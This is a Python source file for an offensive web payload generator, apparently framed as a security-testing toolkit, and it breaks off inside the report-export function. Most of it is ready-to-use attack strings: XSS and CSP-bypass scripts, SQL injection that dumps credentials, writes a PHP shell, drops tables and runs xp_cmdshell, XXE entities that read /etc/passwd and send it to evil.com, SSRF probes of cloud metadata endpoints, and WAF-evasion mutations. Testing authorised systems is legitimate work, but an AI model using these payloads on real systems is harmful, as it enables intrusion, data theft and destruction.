import random
import string
import urllib.parse
import argparse
import json
import hashlib
import re
import base64
import ipaddress
import sys
import os
from datetime import datetime

class PayloadGenerator:
    def __init__(self, complexity="medium", encoding="standard", waf_evasion=False):
        self.complexity = complexity
        self.encoding = encoding
        self.waf_evasion = waf_evasion
        self.payload_signature = datetime.now().strftime("%Y%m%d")
        
    def _encode_payload(self, payload, encoding_override=None):
        """Encode the payload based on specified encoding type"""
        encoding = encoding_override or self.encoding
        
        if encoding == "standard":
            return payload
        elif encoding == "url":
            return urllib.parse.quote(payload)
        elif encoding == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == "hex":
            return ''.join(['%' + hex(ord(c))[2:] for c in payload])
        elif encoding == "unicode":
            return ''.join(['\\u00' + hex(ord(c))[2:].zfill(2) for c in payload])
        elif encoding == "html_entities":
            return ''.join(['&#' + str(ord(c)) + ';' for c in payload])
        elif encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        return payload
    
    def _get_random_string(self, length=8):
        """Generate a random string of fixed length"""
        return ''.join(random.choice(string.ascii_letters) for _ in range(length))
    
    def _add_waf_evasion(self, payload, payload_type):
        """Add WAF evasion techniques to the payload"""
        if not self.waf_evasion:
            return payload
            
        evasion_techniques = {
            "xss": [
                # Case manipulation
                lambda p: p.replace("script", "ScRiPt"),
                lambda p: p.replace("alert", "aLeRt"),
                
                # Whitespace manipulation
                lambda p: p.replace("<script>", "< script >"),
                lambda p: p.replace("onerror=", "onerror = "),
                
                # Entity encoding
                lambda p: p.replace("<", "&#60;").replace(">", "&#62;"),
                
                # String splitting
                lambda p: p.replace("alert(", "a\u200Clert("),
                
                # Script tag alternatives
                lambda p: p.replace("<script>alert", "<svg onload=alert")
            ],
            "sqli": [
                # Comment injection
                lambda p: p.replace("SELECT", "SEL/**/ECT"),
                lambda p: p.replace("UNION", "UN/**/ION"),
                
                # Case manipulation
                lambda p: p.replace("SELECT", "sElEcT"),
                lambda p: p.replace("WHERE", "wHeRe"),
                
                # Spaces alternatives
                lambda p: p.replace(" ", "\t"),
                lambda p: p.replace(" ", "\n"),
                
                # Operator substitution
                lambda p: p.replace("=", "LIKE"),
                lambda p: p.replace("=", "<>")
            ],
            "xxe": [
                # Namespace confusion
                lambda p: p.replace("<!DOCTYPE", "<!DOcTYPE"),
                lambda p: p.replace("SYSTEM", "SyStEm"),
                
                # Entity splitting
                lambda p: p.replace("SYSTEM", "S&#x59;STEM")
            ],
            "ssrf": [
                # IP encoding
                lambda p: p.replace("127.0.0.1", "0177.0.0.1"),
                lambda p: p.replace("127.0.0.1", "2130706433"),
                
                # URL manipulation
                lambda p: p.replace("http://", "hTtP://"),
                lambda p: p.replace("://", ":////"),
                
                # Double-encoding URL parameters
                lambda p: re.sub(r'(\?.*=)(http)', r'\1' + urllib.parse.quote("http"), p)
            ]
        }
        
        if payload_type in evasion_techniques:
            # Apply 1-3 random evasion techniques
            techniques = evasion_techniques[payload_type]
            for _ in range(random.randint(1, 3)):
                technique = random.choice(techniques)
                payload = technique(payload)
                
        return payload
    
    def generate_xss_payloads(self, num=5, bypass_csp=False):
        """Generate XSS test payloads with optional CSP bypass techniques"""
        base_payloads = [
            # Basic alert payloads
            '<script>alert("XSS_TEST")</script>',
            '<img src="x" onerror="alert(\'XSS_TEST\')">',
            '<svg onload="alert(\'XSS_TEST\')">',
            '<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="alert(\'XSS_TEST\')"></div>',
            '"><iframe src="javascript:alert(`XSS_TEST`)"></iframe>',
            '<details open ontoggle="alert(\'XSS_TEST\')">',
            '<body onload="alert(\'XSS_TEST\')">',

            # DOM-based
            '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS_TEST\')">',
            '<iframe srcdoc="<script>alert(\'XSS_TEST\')</script>"></iframe>',
            '<object data="javascript:alert(\'XSS_TEST\')"></object>',
            '<embed src="javascript:alert(\'XSS_TEST\')"></embed>',

            # Attribute breaking
            '" onmouseover="alert(\'XSS_TEST\')" t="',
            '\' onmouseover=\'alert("XSS_TEST")\' t=\'',

            # Bypassing techniques
            '<script>alert`XSS_TEST`</script>',
            '<script>confirm(\'XSS_TEST\')</script>',
            '<script>prompt(\'XSS_TEST\')</script>',
            '<ScRiPt>alert(\'XSS_TEST\')</sCrIpT>',
            '"><script>alert(String.fromCharCode(88,83,83,95,84,69,83,84))</script>',
            '<img src=x onerror=alert(/XSS_TEST/.source)>',

            # JavaScript execution without alert
            '<img src=x onerror="eval(\'al\'+\'ert\\\'XSS_TEST\\\')\')">',
            '<img src=x onerror="(()=>{alert(\'XSS_TEST\')})()">',
            '<img src=x onerror="window[\'al\'+\'ert\'](\'XSS_TEST\')">',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,95,84,69,83,84,39,41))</script>',
            '<script>Object.__defineGetter__(\'x\',function(){alert(\'XSS_TEST\')});location=\'x\';</script>',
            '<script>Object.__defineGetter__(\'x\',function(){alert(\'XSS_TEST\')});x</script>',

            # SVG-based
            '<svg><animate onbegin="alert(\'XSS_TEST\')" attributeName="x"></animate>',
            '<svg><animate onend="alert(\'XSS_TEST\')" attributeName="x" dur="1s"></animate>',
            '<svg><set onbegin="alert(\'XSS_TEST\')" attributeName="x"></set>',
            '<svg><script>alert(\'XSS_TEST\')</script></svg>',
            '<svg><set attributeName="onload" to="alert(\'XSS_TEST\')"/></svg>',

            # Less common events
            '<form id="test" onforminput="alert(\'XSS_TEST\')"><input></form>',
            '<form onsubmit="alert(\'XSS_TEST\');return false"><input type="submit"></form>',
            '<form action="javascript:alert(\'XSS_TEST\')"><input type="submit"></form>',

            # Unicode encoding
            '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(\'XSS_TEST\')">',
            '<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,95,84,69,83,84,39,41))">',
            '<script>\u0061\u006C\u0065\u0072\u0074(\'\u0058\u0053\u0053\u005F\u0054\u0045\u0053\u0054\')</script>',
        ]
        
        # CSP bypass payloads
        csp_bypass_payloads = [
            # DOM-based XSS that might bypass CSP
            '<script>eval(location.hash.slice(1))</script>',
            '<script>setTimeout(`alert(\'XSS_TEST\')`);</script>',
            '<script>window.onload = ()=>{ eval(name); }</script>',
            '<script>setTimeout(atob("YWxlcnQoJ1hTU19URVNUJyk="));</script>',
            '<script>Function("alert(\'XSS_TEST\')")();</script>',
            '<script>new Function`alert\`XSS_TEST\``</script>',
            '<script>window["eval"]("alert(\'XSS_TEST\')");</script>',
            '<script>this["eval"]("alert(\'XSS_TEST\')");</script>',
            '<script>window.onerror=eval;throw "alert(\'XSS_TEST\')";</script>',
            '<div id="root"></div><script>document.getElementById("root").attachShadow({mode: "open"}).innerHTML="<script>alert(\'XSS_TEST\')<\/script>";</script>',

            # Content-Security-Policy bypass attempts
            '<script>setTimeout(\'alert(\"XSS_TEST\")\',0)</script>',
            '<script>setInterval(\'alert(\"XSS_TEST\")\',0)</script>',
            '<script>fetch(\'/\').then(alert(\'XSS_TEST\'))</script>',
            '<script>document.write("<img src=1 onerror=alert(\'XSS_TEST\')>");</script>'
            
            # JSONP-based CSP bypass
            '<script src="https://apis.google.com/js/plusone.js?onload=alert(\'XSS_TEST\')"></script>',
            '<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(\'XSS_TEST\')"></script>',
            '<script src="https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert(\'XSS_TEST\')"></script>',
            
            # Angular-based CSP bypasses
            '<div ng-app ng-csp><div ng-click=$event.view.alert(\'XSS_TEST\')>Click me</div></div>',
            
            # trusted-types bypasses
            '<script>location=\'javascript:alert(\"XSS_TEST\")\'</script>',
        ]
        
        # Selected pool of payloads
        if bypass_csp:
            all_payloads = base_payloads + csp_bypass_payloads
        else:
            all_payloads = base_payloads
            
        # Generate unique payloads
        result = []
        for _ in range(num):
            base = random.choice(all_payloads)
            marker = self._get_random_string(6)
            payload = base.replace("XSS_TEST", f"XSS-{marker}")
            
            # Add complexity if requested
            if self.complexity == "high":
                # Obfuscate payloads for high complexity
                if "<script>" in payload and "</script>" in payload:
                    js_content = payload.split("<script>")[1].split("</script>")[0]
                    obfuscated_js = f"eval(atob('{base64.b64encode(js_content.encode()).decode()}'))"
                    payload = payload.replace(js_content, obfuscated_js)
            
            # Apply WAF evasion if enabled
            payload = self._add_waf_evasion(payload, "xss")
            
            result.append(self._encode_payload(payload))
        
        return result
    
    def generate_sqli_payloads(self, num=5, randomize=True):
        """Generate SQL injection test payloads with WAF bypass techniques"""
        base_payloads = [
            # Basic SQL injection tests
            "' OR '1'='1",
            "' OR '1'='1' --",
            "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\" --",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' OR 1=1;--",
            "' OR '1'='1' /*",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "username' OR 1=1--",
            "username' OR '1'='1",
            "' OR username LIKE '%admin%",
            "admin') OR ('1'='1",
            "admin') OR ('1'='1'--",
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "' GROUP BY 1--",
            "' GROUP BY 2--",
            "' HAVING 1=1--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            "' AND (SELECT COUNT(*) FROM information_schema.columns) > 0--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0--",
            
            # Union-based attacks
            "' UNION SELECT NULL, NULL, NULL, NULL --",
            "' UNION SELECT username, password FROM users --",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--",
            "' UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_name='users'--",
            "' UNION ALL SELECT 1,2,3,4--",
            "' UNION ALL SELECT 1,@@version,3,4--",
            "' UNION ALL SELECT NULL,user(),NULL,NULL--",
            "' UNION ALL SELECT NULL,database(),NULL,NULL--",
            
            # Blind SQL injection
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a' --",
            "' AND ASCII(SUBSTRING((SELECT 'a'),1,1))=97--",
            "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)='u'--",
            "' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='users')>3--",
            
            # Time-based attacks
            "' AND (SELECT 1 FROM (SELECT SLEEP(0.1))a) --",
            "'; WAITFOR DELAY '0:0:0.1' --",
            "'; IF (1=1) WAITFOR DELAY '0:0:0.1'--",
            "'; IF (SELECT user) = 'sa' WAITFOR DELAY '0:0:0.1'--",
            "' OR IF(1=1, SLEEP(0.2), 0)--",
            "' OR (SELECT IF(1=1,SLEEP(0.2),0))--",
            "' OR (SELECT CASE WHEN (1=1) THEN SLEEP(0.2) ELSE 1 END)--",
            
            # Error-based attacks
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) --",
            "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y) --",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--",
            "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
            "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--",

            # Database-specific Payloads
            "' PROCEDURE ANALYSE()--",
            "' LOAD_FILE('/etc/passwd')--",
            "' INTO OUTFILE '/var/www/shell.php'--",
            "'; SELECT pg_sleep(5)--",
            "'; SELECT current_database()--",
            "'; EXEC xp_cmdshell 'net user'--",
            "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--",
            "' FROM dual--",
            "' UNION SELECT NULL FROM SYS.USER_TABLES--",
            "' UNION SELECT sqlite_version()--",
            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
            "'; DROP TABLE users--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "'; INSERT INTO users (username,password) VALUES ('hacker','password123')--",
            "'; DELETE FROM users WHERE username='victim'--"
        ]
        
        # WAF bypass techniques specifically for SQLi
        waf_bypass_sqli = [
            "' OR 1=1 LIMIT 1,1 INTO OUTFILE '/var/www/file' --",
            "' OR '1'='1' LIMIT 1 OFFSET 1 --",
            "' /*!50000 OR*/ '1'='1' --",
            "' /*!50000 UNION*/ /*!50000 SELECT*/ username,password /*!50000 FROM*/ users --",
            "' OR 1=1 COLLATE utf8_general_ci --",
            "' OR ELT(1=1, 1) --",
            "' OR 'abc' LIKE 'a%' --",
            "' OR CONVERT(1, CHAR) = '1' --",
            "' OR/**/'1'='1'--",
            "' OR%09'1'='1'--",
            "' OR%0A'1'='1'--",
            "' oR '1'='1' --",
            "' Or '1'='1' --",
            "' OR '1'=cOnCaT('1') --",
            "' OR 0x31=0x31 --",
            "' OR char(49)=char(49) --",
            "' OR (SELECT 1)=(SELECT 1) --",
            "' OR EXISTS(SELECT 1) --",
            "'+OR+'1'='1'--",
            "'%09OR%09'1'='1'--",
            "'/**/OR/**/1=1--",
            "' OR CONCAT('1','1')=CONCAT('1','1') --",
            "' OR IF(1=1,true,false) --",
            "' OR %2531=%2531 --",
            "' OR STRCMP('test','test')=0 --",
            "' OR REPLACE('1','1','1')='1' --",
            "'\tOR\r\n'1'='1'--",
            "'/**/union/**/all/**/select/**/username,password/**/from/**/users--"
        ]
        
        # Use more complex payloads if requested
        if self.complexity == "high" or randomize:
            base_payloads.extend(waf_bypass_sqli)
        
        # Generate unique payloads
        result = []
        for _ in range(num):
            payload = random.choice(base_payloads)
            
            # Add randomization if requested
            if randomize:
                # Randomize spacing
                payload = re.sub(r'\s+', lambda m: ' ' * random.randint(1, 3), payload)
                
                # Random case for keywords
                for word in ['SELECT', 'UNION', 'WHERE', 'FROM', 'AND', 'OR', 'LIMIT']:
                    if word in payload.upper():
                        random_case = ''.join(random.choice([c.upper(), c.lower()]) for c in word)
                        payload = re.sub(word, random_case, payload, flags=re.IGNORECASE)
            
            # Apply WAF evasion if enabled
            payload = self._add_waf_evasion(payload, "sqli")
            
            result.append(self._encode_payload(payload))
        
        return result
    
    def generate_xxe_payloads(self, num=5):
        """Generate XXE (XML External Entity) injection payloads"""
        base_payloads = [
            # Basic XXE
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>""",

            # XXE with DTD
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://evil.com/malicious.dtd"> %xxe;]>
<foo>&data;</foo>""",

            # XXE with parameter entities
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?data=%file;'>">
%eval;
%exfil;]>
<data>XXE_TEST</data>""",

            # XXE with CDATA
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
%dtd;]>
<data>&all;</data>""",

            # XXE with XInclude
            """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>""",

            # XXE with SOAP
            """<soap:Body>
<foo>
<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://evil.com/malicious.dtd"> %dtd;]>]]>
</foo>
</soap:Body>""",

            # XXE via SVG
            """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image href="file:///etc/passwd"/>
</svg>""",

            # XXE via XML parameter entity
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://evil.com/?%xxe;'>">
%wrapper;]>
<test>&send;</test>"""
        ]
        
        # Generate unique payloads
        result = []
        for _ in range(num):
            payload = random.choice(base_payloads)
            marker = self._get_random_string(6)
            payload = payload.replace("XXE_TEST", f"XXE-{marker}")
            
            # Replace generic evil.com with custom identifiers
            payload = payload.replace("evil.com", f"test-{marker}.example.com")
            
            # Apply WAF evasion if enabled
            payload = self._add_waf_evasion(payload, "xxe")
            
            result.append(self._encode_payload(payload))
        
        return result
    
    def generate_ssrf_payloads(self, num=5):
        """Generate SSRF (Server-Side Request Forgery) test payloads"""
        base_payloads = [
            # Basic SSRF tests
            "http://127.0.0.1/",
            "http://localhost/",
            "https://127.0.0.1:8080/",
            
            # Internal networks
            "http://10.0.0.1/",
            "http://172.16.0.1/",
            "http://192.168.0.1/",
            
            # Alternative representations
            "http://0177.0.0.1/",
            "http://2130706433/", # Decimal representation
            "http://0x7f000001/", # Hex representation
            
            # Protocol wrappers
            "gopher://127.0.0.1:25/",
            "file:///etc/passwd",
            "dict://127.0.0.1:11211/stats",
            
            # Redirection
            "http://website.com?url=http://127.0.0.1/",
            "http://website.com@127.0.0.1",
            
            # Advanced SSRF techniques
            "http://[::1]/", # IPv6
            "http://[::]/?x=", # IPv6 short form
            "http://127.1/", # IPv4 short form
            "http://0/", # IPv4 short form
            
            # SSRF with DNS rebinding
            "http://spoofeddomain.com/",
            
            # URL schema bypass
            "jarfile:///etc/passwd",
            "netdoc:///etc/passwd",
            
            # SSRF via URL parsers
            "http://foo@127.0.0.1:80@www.example.com/",
            "http://127.0.0.1%2523@example.com/",
            
            # Cloud metadata API endpoints
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://metadata/computeMetadata/v1/",
            
            # With fragments to bypass checks
            "http://127.0.0.1%23@example.com/"
        ]
        
        # Generate unique payloads
        result = []
        for _ in range(num):
            payload = random.choice(base_payloads)
            
            # Add port if missing for some payloads
            if "127.0.0.1" in payload and ":" not in payload and self.complexity != "low":
                port = random.randint(1, 9999)
                payload = payload.replace("127.0.0.1", f"127.0.0.1:{port}")
            
            # Add path for some payloads
            if random.choice([True, False]) and self.complexity != "low":
                path = "/" + self._get_random_string(5)
                if payload.endswith("/"):
                    payload = payload[:-1] + path
                else:
                    payload = payload + path
            
            # Apply WAF evasion if enabled
            payload = self._add_waf_evasion(payload, "ssrf")
            
            result.append(self._encode_payload(payload))
        
        return result
    
    def generate_waf_bypass_payloads(self, num=5, target_type="all"):
        """Generate payloads specifically designed to bypass WAF protections"""
        # WAF bypass techniques based on target type
        waf_bypasses = {
            "xss": [
                # Encoding and obfuscation
                "<img src=x onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1)>",
                """<script>$=~[];$={___:++$,$$$$:(![]+'')[$],__$:++$,$_$_:(![]+'')[$],_$_:++$,$_$$:({}+'')[$],$$_$:($[$]+'')[$],_$$:++$,$$$_:(!''+'')[$],$__:++$,$_$:++$,$$__:({}+'')[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+'')[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+'')[$.__$])+((!$)+'')[$._$$]+($.__=$.$_[$.$$_])+($.$=(!''+'')[$.__$])+($._=(!''+'')[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!''+'')[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+'"'+$.$_$_+(![]+'')[$._$_]+$.$$$_+'\\'+$.__$+$.$$_+$._$_+$.__+'\\\\\\'+$.$$_$+$._$+$.$$__+'\\'+$.__$+$.___+$.__$+'\\'+$.__$+$.$$_+$._$$+'\\'+$.__$+$._$_+$._$$+$.$_$_+(![]+'')[$._$_]+'"')())();</script>"""
                "<a/href/onclick=\"eval(atob('YWxlcnQoMSk='))\">click me</a>",
                
                # Mixed cases and alternate syntax
                "<SvG/oNloAd=alert`1`>",
                "<ScRiPt>prompt`1`</ScRiPt>",
                "<sCrIpT>new Function`alt\\u0065rt\\u0028\\u0031\\u0029````</scRiPt>",
                
                # Protocol manipulation
                "<iframe src=\"JaVaScRiPt:alert(1)\"></iframe>",
                "<img src=\"java&#x09;script:alert(1)\">",
                "javascript://%0Aalert(document.cookie)"
            ],
            "sqli": [
                # Comment and whitespace variations
                "/*!50000SELECT*/ user,password /*!50000FROM*/ users",
                "SELECT/**/user,password/**/FROM/**/users",
                "' /*!50000OR*/ 1=1 -- -",
                
                # Alternative syntax
                "'+OR+1=1--+-",
                "' OR 1=1 /* comment */ --",
                "' OR '1'='1' /**/--",
                
                # Nested operations
                "' OR (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 --",
                "' OR NOT NOT NOT NOT 1=1 --",
                
                # Operator substitution
                "' OR 2>1 --",
                "' OR 'abc' LIKE 'a%' --"
            ],
            "xxe": [
                # Entity encoding
                "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">]><test>%xxe;</test>",
                "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY &#x25; xxe SYSTEM \"file:///etc/passwd\">]><test>%xxe;</test>",
                
                # Parameter entity wrapping
                "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % sp SYSTEM \"http://evil.com/xxe.txt\">%sp;%param1;]><data>%exfil;</data>"
            ],
            "ssrf": [
                # IP encoding variations
                "http://0/admin/",
                "http://[::ffff:127.0.0.1]/",
                "http://127.127.127.127/",
                
                # Domain resolution tricks
                "http://localtest.me/",
                "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
                
                # Protocol tricks
                "gopher:/127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM:..."
            ]
        }
        
        result = []
        if target_type == "all":
            # Mix of all types
            for _ in range(num):
                type_choice = random.choice(list(waf_bypasses.keys()))
                payload = random.choice(waf_bypasses[type_choice])
                result.append(self._encode_payload(payload))
        else:
            # Specific type requested
            if target_type in waf_bypasses:
                for _ in range(num):
                    payload = random.choice(waf_bypasses[target_type])
                    result.append(self._encode_payload(payload))
            
        return result
    
    def generate_browser_xss_payloads(self, num=5):
        """Generate browser-specific XSS payloads designed to target specific browsers"""
        browser_specific_payloads = [
            # Chrome-specific
            "<script>chrome.loadTimes()</script>",
            "<script>window.chrome && alert(1)</script>",
            
            # Firefox-specific
            "<svg><script>for each(i in [1]) { alert(i); }</script></svg>",
            "<script>if(typeof InstallTrigger !== 'undefined') alert(1)</script>",
            
            # Safari-specific
            "<script>if(/constructor/i.test(window.HTMLElement)) alert(1)</script>",
            "<script>if(safari) alert(1)</script>",
            
            # Edge-specific
            "<script>if(document.documentMode) alert(1)</script>",
            "<script>if(window.StyleMedia) alert(1)</script>",
            
            # Multiple browser targets
            "<script>if(typeof InstallTrigger !== 'undefined' || /constructor/i.test(window.HTMLElement) || !!window.chrome || !!window.StyleMedia) alert(1)</script>",
            "<script>\nvar browser = (function() {\n  var ua= navigator.userAgent, tem, \n  M= ua.match(/(opera|chrome|safari|firefox|msie|trident)\\/?\\s*([\\d\\.]+)/i) || [];\n  alert(M[1]);\n})();\n</script>"
        ]
        
        # Advanced HTML5 API features for modern browsers
        html5_payloads = [
            "<script>navigator.vibrate(500)</script>",
            "<script>if(navigator.getBattery) navigator.getBattery().then(b => alert(b.level))</script>",
            "<body style='overflow:hidden;' onload='alert(1)' onscroll='alert(2)'><div style='height:1000px'></div></body>",
            "<video><source onerror='alert(1)'>"
        ]
        
        all_payloads = browser_specific_payloads + html5_payloads
        
        result = []
        for _ in range(num):
            payload = random.choice(all_payloads)
            marker = self._get_random_string(6)
            
            # Randomize alert message
            payload = re.sub(r'alert\([^)]+\)', f'alert("XSS-{marker}")', payload)
            
            # Apply WAF evasion if enabled
            payload = self._add_waf_evasion(payload, "xss")
            
            result.append(self._encode_payload(payload))
            
        return result
    
    def generate_all_payloads(self, num_each=3):
        """Generate all types of payloads"""
        result = {
            "xss": self.generate_xss_payloads(num_each),
            "xss_csp_bypass": self.generate_xss_payloads(num_each, bypass_csp=True),
            "sqli": self.generate_sqli_payloads(num_each, randomize=True),
            "xxe": self.generate_xxe_payloads(num_each),
            "ssrf": self.generate_ssrf_payloads(num_each),
            "browser_xss": self.generate_browser_xss_payloads(num_each),
            "waf_bypass": self.generate_waf_bypass_payloads(num_each)
        }
        return result

def add_signature(payloads):
    """Add testing signature to payloads to identify them as test payloads"""
    for payload_type, payload_list in payloads.items():
        for i, payload in enumerate(payload_list):
            # Create a signature hash to identify these as test payloads
            signature = hashlib.md5(f"KING_SEARCH_TEST_{payload}".encode()).hexdigest()[:8]
            if '<' in payload and '>' in payload:
                # For HTML/XML payloads
                payload_list[i] = f"{payload}<!-- test_sig:{signature} -->"
            elif payload.startswith('<?xml'):
                # For XML payloads
                payload_list[i] = f"{payload}<!-- test_sig:{signature} -->"
            else:
                # For other payloads
                payload_list[i] = f"{payload}/*test_sig:{signature}*/"

def save_payload_to_file(payloads, output_dir, filename_prefix='payload'):
    """Save payloads to files based on their type"""
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
        
    for payload_type, payload_list in payloads.items():
        filename = f"{filename_prefix}_{payload_type}.txt"
        filepath = os.path.join(output_dir, filename)
        
        with open(filepath, 'w') as f:
            for payload in payload_list:
                f.write(f"{payload}\n")
        
        print(f"Saved {len(payload_list)} {payload_type} payloads to {filepath}")
        
def export_as_json(payloads, output_file):
    """Export payloads as JSON file"""
    with open(output_file, 'w') as f:
        json.dump(payloads, f, indent=2)
    print(f"Exported all payloads to {output_file}")

def export_as_curl(payloads, target_url, output_file):
    """Export payloads as curl commands for easy testing"""
    with open(output_file, 'w') as f:
        for payload_type, payload_list in payloads.items():
            f.write(f"# {payload_type.upper()} Payloads\n")
            
            for i, payload in enumerate(payload_list):
                # URL encode the payload for use in curl
                encoded_payload = urllib.parse.quote(payload)
                
                # Create a curl command with the payload
                if '?' in target_url:
                    # URL already has parameters
                    curl_cmd = f"curl -s -k '{target_url}&payload={encoded_payload}'\n"
                else:
                    # URL has no parameters yet
                    curl_cmd = f"curl -s -k '{target_url}?payload={encoded_payload}'\n"
                    
                f.write(curl_cmd)
            
            f.write("\n")
    
    print(f"Exported curl commands to {output_file}")

def export_payload_report(payloads, output_file):
    """Generate a detailed HTML report of all payloads with descriptions"""
    html_template = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Payload Report</title>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; color: #333; }
        h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
        h2 { color: #2980b9; margin-top: 30px; }
        .payload-container { margin-bottom: 40px; }
        .payload { background-color: #f7f9fb; border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 4px; font-family: monospace; white-space: pre-wrap; word-break: break-all; }
        .payload-type { font-weight: bold; margin-bottom: 5px; }
        .description { margin-bottom: 15px; }
        .tag { display: inline-block; background-color: #3498db; color: white; padding: 3px 8px; border-radius: 3px; font-size: 12px; margin-right: 5px; }
        .timestamp { color: #7f8c8d; font-size: 14px; margin-top: 5px; }
        .summary { margin: 20px 0; padding: 15px; background-color: #f8f9fa; border-left: 5px solid #3498db; }
    </style>
</head>
<body>
    <h1>Security Testing Payload Report</h1>
    <div class="timestamp">Generated on: {timestamp}</div>
    
    <div class="summary">
        <p>This report contains {total_payloads} security testing payloads across {payload_types} categories.</p>
        <p>These payloads are intended for security testing purposes only. Use responsibly and ethically.</p>
    </div>

    {payload_content}
    
    <footer>
        <p>&copy; {current_year} - Security Testing Toolkit</p>
    </footer>
</body>
</html>
"""

    # Descriptions for each payload type
    payload_descriptions = {
        "xss": "Cross-Site Scripting (XSS) payloads that attempt to execute JavaScript in a browser context.",
        "xss_csp_bypass": "Advanced XSS payloads specifically designed to bypass Content Security Policy (CSP) protections.",
        "sqli": "SQL Injection payloads that attempt to manipulate database queries.",
        "xxe": "XML External Entity (XXE) injection payloads that exploit XML parsers.",
        "ssrf": "Server-Side Request Forgery (SSRF) payloads that attempt to make the server perform unintended requests.",
        "browser_xss": "Browser-specific XSS payloads targeting features or vulnerabilities in specific browsers.",
        "waf_bypass": "Specialized payloads designed to evade Web Application Firewall (WAF) protections."
    }
    
    # Generate HTML content for each payload type
    payload_content = ""
    total_count = 0
    
    for payload_type, payload_list in payloads.items():
        total_count += len(payload_list)
        description = payload_descriptions.get(payload_type, "No description available.")
        
        payload_content += f"""
    <div class="payload-container">
        <h2>{payload_type.replace('_', ' ').upper()} Payloads</h2>
        <div class="description">{description}</div>
        <div class="tag">Count: {len(payload_list)}</div>
"""
        
        for i, payload in enumerate(payload_list):
            payload_content += f"""
        <div class="payload-type">Payload #{i+1}:</div>
        <div class="payload">{payload.replace('<', '&lt;').replace('>', '&gt;')}</div>
"""
            
        payload_content += """
    </div>
"""
    
    # Fill in the template
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    current_year = datetime.now().year
    
    html_report = html_template.format(
        timestamp=current_time,
        total_payloads=total_count,
        payload_types=len(payloads),
        payload_content=payload_content,
        current_year=current_year
    )
    
    # Write to file
    with open(output_file, 'w') as f:
